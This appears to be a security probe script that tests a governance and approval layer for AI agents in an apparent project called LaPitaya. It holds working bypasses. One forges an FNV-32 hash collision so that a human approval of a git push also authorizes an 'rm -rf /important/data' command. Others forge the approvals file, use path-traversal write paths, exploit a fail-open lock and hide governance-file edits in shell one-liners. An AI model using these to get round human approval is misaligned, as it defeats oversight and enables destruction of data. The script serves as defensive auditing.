const path = require('path');
const R = 'C:/PitayaCode/LaPitaya';
const loadTs = require(R + '/test/load-ts.cjs');
const electron = require.resolve(R + '/node_modules/electron');
require.cache[electron] = { id: electron, filename: electron, loaded: true, exports: {} };
const { CimaRuntimeService } = loadTs('src/main/cimaRuntime.ts');
const gov = loadTs('src/shared/lapitaya/governance.ts');
const risk = loadTs('src/shared/lapitaya/toolRisk.ts');
const fs = require('fs'), os = require('os'), p = path;
const out = (k, v) => console.log(k.padEnd(38), typeof v === 'string' ? v : JSON.stringify(v));
function mk() { const d = fs.mkdtempSync(p.join(os.tmpdir(), 'v13-')); const hive = p.join(d, 'hive'); fs.mkdirSync(p.join(hive, 'lapitaya'), { recursive: true }); return { d, hive, dir: p.join(hive, 'lapitaya') }; }
const svc = (hive, extra = {}) => new CimaRuntimeService({ hiveRoot: () => hive, godId: () => 'god', ...extra });
const step = (name, fn) => { try { fn(); } catch (e) { console.log(name, 'PROBE ERROR', String(e).slice(0, 200)); } };

// ---- P1 FNV-32 second preimage -> approval of A authorizes B
const P = 0x01000193;
function inv32(a) { let x = a; for (let i = 0; i < 5; i++) x = Math.imul(x, 2 - Math.imul(a, x)) >>> 0; return x >>> 0; }
const Pinv = inv32(P);
function fwd(h, str) { for (const c of Buffer.from(str)) { h ^= c; h = Math.imul(h, P) >>> 0; } return h >>> 0; }
function craft(agent, tool, cmdPrefix, target) {
  const pre = `${agent}\u0000${tool}\u0000{"command":"${cmdPrefix}`;
  const s0 = fwd(0x811c9dc5, pre);
  const chars = []; for (let c = 33; c < 127; c++) if (c !== 34 && c !== 92) chars.push(c);
  const unwind = (h, b) => ((Math.imul(h, Pinv) >>> 0) ^ b) >>> 0;
  const Rr = unwind(unwind(target >>> 0, '}'.charCodeAt(0)), '"'.charCodeAt(0));
  const back = new Map();
  for (const b3 of chars) for (const b4 of chars) back.set(unwind(unwind(Rr, b4), b3), [b3, b4]);
  for (const b1 of chars) for (const b2 of chars) {
    let h = Math.imul((s0 ^ b1) >>> 0, P) >>> 0; h = Math.imul((h ^ b2) >>> 0, P) >>> 0;
    if (back.has(h)) { const [b3, b4] = back.get(h); return cmdPrefix + String.fromCharCode(b1, b2, b3, b4); }
  }
  return null;
}
out('Pinv check (expect 1)', Math.imul(P, Pinv) >>> 0);
step('P1', () => {
  const { hive } = mk(); const s = svc(hive);
  const A = { command: 'git push origin feature-x' };
  const a1 = s.authorize('agent-1', 'Bash', A);
  out('P1 A first call', [a1.decision, a1.risk, a1.fingerprint]);
  const ap = s.listApprovals()[0]; s.decide(ap.id, true, 'human');
  const Bsfx = craft('agent-1', 'Bash', 'rm -rf /important/data # ', parseInt(a1.fingerprint, 16));
  out('P1 crafted B', String(Bsfx));
  const B = { command: Bsfx };
  out('P1 fp(A) vs fp(B)', [gov.toolCallFingerprint('agent-1', 'Bash', A), gov.toolCallFingerprint('agent-1', 'Bash', B)]);
  const b = s.authorize('agent-1', 'Bash', B);
  out('P1 authorize(B) using approval of A', [b.decision, b.category, b.rule, b.approvalId]);
});
// ---- P2 path-traversal classification of governance writes
step('P2', () => {
  const { hive } = mk(); const ctx = { hiveRoot: hive };
  const h = hive.replace(/\\/g, '/');
  const cases = [
    `${h}/lapitaya/approvals.json`,
    `${h}/agents/x/../../lapitaya/approvals.json`,
    `C:/Windows/../${h.slice(3)}/lapitaya/approvals.json`,
    `${h}/./lapitaya/approvals.json`,
    `${h}//lapitaya/approvals.json`,
    `lapitaya/approvals.json`,
    `../hive/lapitaya/approvals.json`,
  ];
  for (const c of cases) { const r = risk.classifyWritePath(c, ctx); out('P2 ...' + c.slice(-44), [r.category, r.risk, r.rule]); }
});
// ---- P3 forged approvals.json accepted (no integrity MAC)
step('P3', () => {
  const { hive, dir } = mk(); const s = svc(hive);
  const A = { command: 'git push origin main' };
  const fp = gov.toolCallFingerprint('agent-1', 'Bash', A);
  fs.writeFileSync(p.join(dir, 'approvals.json'), JSON.stringify([{ id: 'apr-forged', agentId: 'agent-1', tool: 'Bash', fingerprint: fp, category: 'irreversible', risk: 'HIGH', summary: 'x', status: 'approved', createdAt: Date.now() }]));
  const r = s.authorize('agent-1', 'Bash', A);
  out('P3 forged approvals.json', [r.decision, r.approvalId]);
});
// ---- P4 lock is fail-open
step('P4', () => {
  const { hive, dir } = mk(); const s = svc(hive);
  fs.writeFileSync(p.join(dir, '.governance.lock'), '');
  const t0 = Date.now(); const r = s.authorize('agent-1', 'Read', { file_path: 'x.ts' });
  out('P4 authorize with held fresh lock', [r.decision, 'ms=' + (Date.now() - t0), 'lockStillThere=' + fs.existsSync(p.join(dir, '.governance.lock'))]);
});
// ---- P5 stale read between instances for unlocked readers
step('P5', () => {
  const { hive } = mk(); const A = svc(hive), B = svc(hive);
  A.handle('god', 'w', { taskId: 'T', phase: 'BUILD' });
  const before = A.completionGate('T');
  B.submit('god', { taskId: 'T', phase: 'DECISION', verdict: 'PASS' });
  const after = A.completionGate('T');
  out('P5 A.completionGate before/after', [before.allowed, after.allowed, after.reason.slice(0, 60)]);
});
// ---- P6 truncated final line
step('P6', () => {
  const { hive, dir } = mk(); const s = svc(hive);
  s.authorize('agent-1', 'Read', { file_path: 'a.ts' });
  fs.appendFileSync(p.join(dir, 'cima-ledger.jsonl'), '{"kind":"governance","ts":17');
  const r1 = s.authorize('agent-1', 'Read', { file_path: 'a.ts' });
  out('P6 after truncated tail', [r1.decision, r1.rule]);
  const t = svc(hive); const r2 = t.authorize('agent-1', 'Read', { file_path: 'a.ts' }); out('P6 new instance', [r2.decision, r2.rule]);
  const rec = t.submit('agent-2', { taskId: 'Z', phase: 'BUILD', verdict: 'BLOCKED' });
  out('P6 submit() under corrupt state', [rec.verdict, 'no corruption check in submit/handle']);
  out('P6 recordTrace under corrupt', String(t.recordTrace('agent-1', 'PostToolUse', 'Read', { file_path: 'a' }, 'x')));
  out('P6 ledger tail now', fs.readFileSync(p.join(dir, 'cima-ledger.jsonl'), 'utf8').split('\n').slice(-3).map((x) => x.slice(0, 70)));
});
// ---- P7 approved-but-unconsumed approvals never expire
step('P7', () => {
  const { hive } = mk(); let now = 1_000_000_000_000; const s = svc(hive, { now: () => now });
  const A = { command: 'git push origin main' };
  s.authorize('agent-1', 'Bash', A); s.decide(s.listApprovals()[0].id, true, 'human');
  now += 30 * 24 * 3600 * 1000;
  const r = s.authorize('agent-1', 'Bash', A);
  out('P7 approved 30d ago, still valid', [r.decision]);
});
// ---- P8 perf
for (const n of [1000, 10000, 50000]) step('P8', () => {
  const { hive, dir } = mk(); const s = svc(hive);
  const line = JSON.stringify({ kind: 'governance', ts: 1, agentId: 'a', taskId: null, phase: null, tool: 'Read', action: 'read x', category: 'read-code', risk: 'LOW', mode: 'AUTO', decision: 'ALLOW', rule: 'read', fingerprint: 'deadbeef' }) + '\n';
  fs.writeFileSync(p.join(dir, 'cima-ledger.jsonl'), line.repeat(n)); fs.writeFileSync(p.join(dir, 'traces.jsonl'), line.repeat(n));
  const t0 = process.hrtime.bigint(); for (let i = 0; i < 5; i++) s.authorize('agent-1', 'Read', { file_path: 'a.ts' });
  out('P8 ledger+traces lines=' + n, 'avg ms/authorize=' + (Number(process.hrtime.bigint() - t0) / 5e6).toFixed(1));
});
// ---- P9 shell classification of indirect governance mutation
step('P9', () => {
  for (const cmd of ['node fix.js', "node -e \"require('fs').writeFileSync('ta'+'sks.json','{}')\"", "python -c \"open('tasks.json','w').write('{}')\"", 'sed -i s/doing/done/ tasks.json', 'echo x >> tasks.json'])
    { const r = risk.classifyShell(cmd); out('P9 ' + cmd.slice(0, 50), [r.category, r.risk, r.rule]); }
});
